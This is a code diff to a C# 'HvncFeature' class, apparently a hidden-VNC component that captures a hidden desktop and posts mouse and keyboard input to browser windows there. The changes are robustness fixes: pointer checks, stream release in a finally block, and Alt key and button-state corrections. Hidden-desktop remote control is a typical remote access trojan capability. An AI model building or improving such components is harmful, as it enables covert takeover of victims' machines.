@@ -742,6 +742,7 @@ internal static class HvncFeature
             if (copyW <= 0 || copyH <= 0) continue;
 
             // Direct pixel copy: DIBSection → composite (no BitBlt overhead)
+            if (_compBits == 0) return false; // Stop() freed composite mid-loop
             byte* srcPx  = (byte*)entry.Bits;
             byte* dstPx  = (byte*)_compBits;
             int   srcStr = ww * 4;
@@ -784,14 +785,6 @@ internal static class HvncFeature
         for (int i = 0; i < n; i += 32)
             h64 = (h64 ^ p[i]) * FnvPrime;
         return h64;
-    }
-
-    // JPEG path — captures composite and encodes to JPEG bytes.
-    private static unsafe byte[]? CaptureFrame()
-    {
-        if (!CaptureComposite()) return null;
-        // DIBSection pixels in _compBits are BGRA (PixelFormat32bppARGB / 0x26200A)
-        return EncodeJpeg(_compBits, _canvasW, _canvasH, _canvasW * 4);
     }
 
     // ── Composite DIBSection ──────────────────────────────────────────────────
@@ -873,35 +866,39 @@ internal static class HvncFeature
         {
             nint stream = SHCreateMemStream(0, 0);
             if (stream == 0) return null;
-            int q  = _quality;
-            var ep = new EncoderParams
-            {
-                Count = 1,
-                Param = new EncoderParam { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) }
-            };
-            var clsid = JpegClsid;
-            GdipSaveImageToStream(bmp, stream, ref clsid, (nint)(&ep));
-            // Cache vtable delegates on first call — all SHCreateMemStream instances share the same vtable.
+            // Cache vtable delegates immediately — before any call that could throw.
+            // All SHCreateMemStream instances share the same vtable.
             _vtRelease ??= Marshal.GetDelegateForFunctionPointer<VtRelease>((*(nint**)stream)[2]);
             _vtSeek    ??= Marshal.GetDelegateForFunctionPointer<VtSeek>   ((*(nint**)stream)[5]);
             _vtRead    ??= Marshal.GetDelegateForFunctionPointer<VtRead>   ((*(nint**)stream)[3]);
-
-            // Seek to end to get size, then seek back to start — one alloc, one read
-            long size = 0;
-            _vtSeek(stream, 0, 2 /*STREAM_SEEK_END*/, ref size);
-            if (size <= 0) { _vtRelease(stream); return null; }
-            long pos = 0;
-            _vtSeek(stream, 0, 0 /*STREAM_SEEK_SET*/, ref pos);
-
-            var result = new byte[size];
-            fixed (byte* pResult = result)
+            try
             {
-                uint cbRead = 0;
-                _vtRead(stream, (nint)pResult, (uint)size, out cbRead);
-                _vtRelease(stream);
-                if (cbRead == 0) return null;
+                int q  = _quality;
+                var ep = new EncoderParams
+                {
+                    Count = 1,
+                    Param = new EncoderParam { Guid = EncQuality, Count = 1, Type = 4, Value = (nint)(&q) }
+                };
+                var clsid = JpegClsid;
+                GdipSaveImageToStream(bmp, stream, ref clsid, (nint)(&ep));
+
+                // Seek to end to get size, then seek back to start — one alloc, one read
+                long size = 0;
+                _vtSeek(stream, 0, 2 /*STREAM_SEEK_END*/, ref size);
+                if (size <= 0) return null;
+                long pos = 0;
+                _vtSeek(stream, 0, 0 /*STREAM_SEEK_SET*/, ref pos);
+
+                var result = new byte[size];
+                fixed (byte* pResult = result)
+                {
+                    uint cbRead = 0;
+                    _vtRead(stream, (nint)pResult, (uint)size, out cbRead);
+                    if (cbRead == 0) return null;
+                }
+                return result;
             }
-            return result;
+            finally { _vtRelease(stream); }
         }
         finally { GdipDisposeImage(bmp); }
     }
@@ -1128,6 +1125,7 @@ internal static class HvncFeature
                         var cClose = new POINT { x = x, y = y };
                         ScreenToClient(hwnd, ref cClose);
                         PostMessage(hwnd, WM_LBUTTONUP, 0, MakeLParam(cClose.x, cClose.y));
+                        _lbDownHwnd = 0;
                         PostMessage(root, WM_CLOSE, 0, 0);
                         // Explorer with a media preview can take several seconds to handle WM_CLOSE
                         // (preview handler flushes video decode buffers). Force-kill after 1.5 s.
@@ -1146,9 +1144,10 @@ internal static class HvncFeature
                         return;
                     }
                     if (hit == HTMAXBUTTON)
-                        { ShowWindow(root, IsWindowMaximized(root) ? 9 /*SW_RESTORE*/ : 3 /*SW_SHOWMAXIMIZED*/); return; }
+                        { _lbDownHwnd = 0; ShowWindow(root, IsWindowMaximized(root) ? 9 /*SW_RESTORE*/ : 3 /*SW_SHOWMAXIMIZED*/); return; }
                     if (hit == HTMINBUTTON)
                     {
+                        _lbDownHwnd = 0;
                         // WM_SYSCOMMAND SC_MINIMIZE is more reliable than ShowWindow(SW_MINIMIZE)
                         // for Chromium browsers on a hidden desktop (no taskbar to anchor minimised state).
                         PostMessage(root, 0x0112 /*WM_SYSCOMMAND*/, 0xF020 /*SC_MINIMIZE*/, 0);
@@ -1344,8 +1343,9 @@ internal static class HvncFeature
         bool isModifier = vk is 0x10 or 0xA0 or 0xA1 or 0x11 or 0xA2 or 0xA3 or 0x12 or 0xA4 or 0xA5 or 0x14;
         if (isModifier)
         {
-            // Alt key down uses WM_SYSKEYDOWN; Alt key up (and all other modifiers) use normal KEYDOWN/UP.
-            uint msg = (isAltKey && down) ? WM_SYSKEYDOWN : (down ? WM_KEYDOWN : WM_KEYUP);
+            // Alt uses WM_SYSKEYDOWN on press and WM_SYSKEYUP on release; other modifiers use KEYDOWN/UP.
+            uint msg = isAltKey ? (down ? WM_SYSKEYDOWN : WM_SYSKEYUP)
+                                : (down ? WM_KEYDOWN    : WM_KEYUP);
             PostMessage(hwnd, msg, (nint)vk, down ? lpDn : lpUp);
             return;
         }
